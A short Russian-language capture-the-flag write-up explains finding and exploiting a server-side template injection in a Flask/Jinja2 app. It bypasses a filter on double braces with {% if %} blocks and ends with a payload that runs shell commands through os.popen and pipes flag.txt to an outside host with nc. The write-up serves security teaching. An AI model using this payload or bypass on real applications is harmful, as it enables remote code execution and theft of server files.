### Writeup

На главной странице задания есть возможность ввести пользовательские данные, попробуем заполнить поля и отправить их.
![Ввод пользовательских данных](writeup_pics/1.png)

При отправке данных вся информация отражается пользователю.

![Данные отобразились пользователю](writeup_pics/2.png)

Кроме того, при изучении хедеров в ответе сервера можно заметить, что в качестве бекенда используется python. Проведём стандартный тест на SSTI (Server Side Template Injection) для Flask:

![Тест на уязвимость](writeup_pics/3.png)

Мы получили блокировку от сервера, что подтверждает догадки об уязвимости SSTI

![Блок от сервера](writeup_pics/4.png)

В синтаксисе шиблонизатора Jinja2 (который используется в Flask-приложениях) поддержаваются альтернативные способы реализации шаблонов: для обхода блокировки попробуем использовать условное выражение `{% if 1==1 %} This text visible only if condition is true {% endif %}` вместо двойных брекетов `{{}}`:

![Обход блокировки](writeup_pics/5.png)

Блокировка успешно обойдена.

![Обход блокировки](writeup_pics/6.png)

Так как у атакующего есть лишь информация о том, верно ли выражение в брекетах или нет, у него есть возможность получить флаг посимвольным чтением, или же послать флаг на подконтрольный ему сервер, как показано в примере ниже:

`{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag.txt | nc 192.168.100.48 7777')['read']() %} a {% endif %}`
